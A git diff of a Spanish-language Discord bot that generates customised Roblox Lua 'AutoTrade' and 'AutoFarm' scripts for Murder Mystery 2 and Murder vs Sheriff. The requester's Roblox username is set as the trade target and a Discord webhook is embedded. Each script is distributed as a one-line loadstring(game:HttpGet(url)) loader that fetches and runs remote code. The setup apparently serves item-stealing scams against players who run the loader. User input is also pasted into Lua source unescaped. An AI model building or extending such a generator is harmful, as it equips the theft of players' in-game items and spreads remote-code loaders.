@@ -19,12 +19,16 @@ const client = new Client({
 
 const SERVER_URL = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 3000}`;
 let MM2_SCRIPT = '';
+let MVS_SCRIPT = '';
+
+const VALID_RARITIES = ['Common', 'Uncommon', 'Rare', 'Legendary', 'Mythic', 'Ancient'];
 
 try {
   MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
-  console.log('✅ Script MM2 cargado correctamente');
+  MVS_SCRIPT = fs.readFileSync('./mvs-script.lua', 'utf8');
+  console.log('✅ Scripts Lua cargados correctamente');
 } catch (error) {
-  console.error('❌ Error al cargar mm2-script.lua:', error.message);
+  console.error('❌ Error al cargar scripts:', error.message);
   process.exit(1);
 }
 
@@ -101,7 +105,7 @@ client.once('ready', () => {
       .setName('generate')
       .setDescription('Genera un script personalizado')
       .addSubcommand(sub =>
-        sub.setName('script').setDescription('Genera script de AutoTrade para MM2')
+        sub.setName('script').setDescription('Genera un script personalizado (MM2 / MVS)')
       ),
   ];
 
@@ -132,7 +136,12 @@ client.on('interactionCreate', async (interaction) => {
               .setLabel('Murder Mystery 2')
               .setValue('mm2')
               .setDescription('AutoTrade para MM2')
-              .setEmoji('🔪')
+              .setEmoji('🔪'),
+            new StringSelectMenuOptionBuilder()
+              .setLabel('Murder vs Sheriff')
+              .setValue('mvs')
+              .setDescription('AutoFarm para MVS')
+              .setEmoji('🔫')
           );
 
         const row = new ActionRowBuilder().addComponents(selectMenu);
@@ -145,42 +154,76 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     if (interaction.isStringSelectMenu()) {
+      // Paso 1: elegir juego
       if (interaction.customId === 'game_select') {
         const game = interaction.values[0];
 
-        const modal = new ModalBuilder()
-          .setCustomId(`config_modal_${game}`)
-          .setTitle('Configurar Script Personalizado');
+        if (game === 'mm2') {
+          return interaction.showModal(buildConfigModal('cfg|mm2||'));
+        }
 
-        const usernameInput = new TextInputBuilder()
-          .setCustomId('username')
-          .setLabel('Tu Usuario de Roblox')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('ejemplo: claudee')
-          .setRequired(true)
-          .setMinLength(1)
-          .setMaxLength(20);
+        if (game === 'mvs') {
+          // Paso 2: elegir modo
+          const modeMenu = new StringSelectMenuBuilder()
+            .setCustomId('mvs_mode')
+            .setPlaceholder('Selecciona el modo')
+            .addOptions(
+              new StringSelectMenuOptionBuilder()
+                .setLabel('All (todo)')
+                .setValue('all')
+                .setDescription('Farmea todo sin filtrar rareza')
+                .setEmoji('📦'),
+              new StringSelectMenuOptionBuilder()
+                .setLabel('Rarity (por rareza)')
+                .setValue('rarity')
+                .setDescription('Elige qué rarezas farmear')
+                .setEmoji('💎')
+            );
+          return interaction.update({
+            content: '⚙️ Selecciona el modo para **Murder vs Sheriff**:',
+            components: [new ActionRowBuilder().addComponents(modeMenu)],
+          });
+        }
+      }
 
-        const webhookInput = new TextInputBuilder()
-          .setCustomId('webhook')
-          .setLabel('Discord Webhook URL')
-          .setStyle(TextInputStyle.Paragraph)
-          .setPlaceholder('https://discord.com/api/webhooks/...')
-          .setRequired(true)
-          .setMinLength(10);
+      // Paso 2 (MVS): modo elegido
+      if (interaction.customId === 'mvs_mode') {
+        const mode = interaction.values[0];
 
-        modal.addComponents(
-          new ActionRowBuilder().addComponents(usernameInput),
-          new ActionRowBuilder().addComponents(webhookInput)
-        );
+        if (mode === 'all') {
+          return interaction.showModal(buildConfigModal('cfg|mvs|all|'));
+        }
 
-        await interaction.showModal(modal);
+        if (mode === 'rarity') {
+          // Paso 3: elegir rarezas (multi-select)
+          const rarityMenu = new StringSelectMenuBuilder()
+            .setCustomId('mvs_rarity')
+            .setPlaceholder('Selecciona una o más rarezas')
+            .setMinValues(1)
+            .setMaxValues(VALID_RARITIES.length)
+            .addOptions(
+              VALID_RARITIES.map(r =>
+                new StringSelectMenuOptionBuilder().setLabel(r).setValue(r)
+              )
+            );
+          return interaction.update({
+            content: '💎 Selecciona las rarezas a farmear:',
+            components: [new ActionRowBuilder().addComponents(rarityMenu)],
+          });
+        }
+      }
+
+      // Paso 3 (MVS rarity): rarezas elegidas
+      if (interaction.customId === 'mvs_rarity') {
+        const rarities = interaction.values.join(',');
+        return interaction.showModal(buildConfigModal(`cfg|mvs|rarity|${rarities}`));
       }
     }
 
     if (interaction.isModalSubmit()) {
-      if (interaction.customId.startsWith('config_modal_')) {
-        const game = interaction.customId.replace('config_modal_', '');
+      if (interaction.customId.startsWith('cfg|')) {
+        const [, game, mode, rarityStr] = interaction.customId.split('|');
+        const rarities = rarityStr ? rarityStr.split(',') : [];
         const username = interaction.fields.getTextInputValue('username');
         const webhook = interaction.fields.getTextInputValue('webhook');
 
@@ -210,7 +253,7 @@ client.on('interactionCreate', async (interaction) => {
         }
 
         try {
-          const script = await generateScript(game, username, webhook);
+          const script = await generateScript({ game, username, webhook, mode, rarities });
           const storeResponse = await axios.post(`${SERVER_URL}/api/store-script`, { script });
           const { id, url } = storeResponse.data;
           const loadstring = `loadstring(game:HttpGet("${url}"))()`;
@@ -223,7 +266,7 @@ client.on('interactionCreate', async (interaction) => {
             // Registrar
             cooldowns.set(interaction.user.id, Date.now());
             totalScripts++;
-            scriptLogs.unshift({ tag: interaction.user.tag, id: interaction.user.id, robloxUser: username, time: new Date().toISOString() });
+            scriptLogs.unshift({ tag: interaction.user.tag, id: interaction.user.id, robloxUser: username, game, time: new Date().toISOString() });
             if (scriptLogs.length > 50) scriptLogs.pop();
             updateStatus();
             saveData();
@@ -248,12 +291,56 @@ client.on('interactionCreate', async (interaction) => {
 });
 
 // --- Funciones ---
-async function generateScript(game, username, webhook) {
+function buildConfigModal(customId) {
+  const modal = new ModalBuilder()
+    .setCustomId(customId)
+    .setTitle('Configurar Script Personalizado');
+
+  const usernameInput = new TextInputBuilder()
+    .setCustomId('username')
+    .setLabel('Tu Usuario de Roblox')
+    .setStyle(TextInputStyle.Short)
+    .setPlaceholder('ejemplo: claudee')
+    .setRequired(true)
+    .setMinLength(1)
+    .setMaxLength(20);
+
+  const webhookInput = new TextInputBuilder()
+    .setCustomId('webhook')
+    .setLabel('Discord Webhook URL')
+    .setStyle(TextInputStyle.Paragraph)
+    .setPlaceholder('https://discord.com/api/webhooks/...')
+    .setRequired(true)
+    .setMinLength(10);
+
+  modal.addComponents(
+    new ActionRowBuilder().addComponents(usernameInput),
+    new ActionRowBuilder().addComponents(webhookInput)
+  );
+  return modal;
+}
+
+async function generateScript({ game, username, webhook, mode, rarities }) {
   if (game === 'mm2') {
     return MM2_SCRIPT
       .replace(/TARGET_USER = "example"/g, `TARGET_USER = "${username}"`)
       .replace(/WEBHOOK_URL = "example"/g, `WEBHOOK_URL = "${webhook}"`);
   }
+
+  if (game === 'mvs') {
+    // Validar rarezas contra la lista permitida
+    const safeRarities = (rarities || []).filter(r => VALID_RARITIES.includes(r));
+    const rarityList = safeRarities.length
+      ? safeRarities.map(r => `"${r}"`).join(', ')
+      : '"Ancient", "Mythic"';
+
+    return MVS_SCRIPT
+      .replace(/local TARGET = "example"/, `local TARGET = "${username}"`)
+      .replace(/local MODE = "all"/, `local MODE = "${mode === 'rarity' ? 'rarity' : 'all'}"`)
+      .replace(/local RARITIES = \{ "Ancient", "Mythic" \}/, `local RARITIES = { ${rarityList} }`)
+      .replace(/local WEBHOOK = "example"/, `local WEBHOOK = "${webhook}"`);
+  }
+
   throw new Error('Juego no soportado');
 }
 
@@ -362,7 +449,7 @@ client.on('messageCreate', async (message) => {
       return;
     }
     const lines = recent.map((l, i) =>
-      `**${i + 1}.** ${l.tag} → \`${l.robloxUser}\` — <t:${Math.floor(new Date(l.time).getTime() / 1000)}:R>`
+      `**${i + 1}.** ${l.tag} → \`${l.robloxUser}\` ${l.game ? `[${l.game}]` : ''} — <t:${Math.floor(new Date(l.time).getTime() / 1000)}:R>`
     ).join('\n');
     await message.reply(`📋 **Últimos ${recent.length} scripts:**\n${lines}`).catch(() => {});
     return;
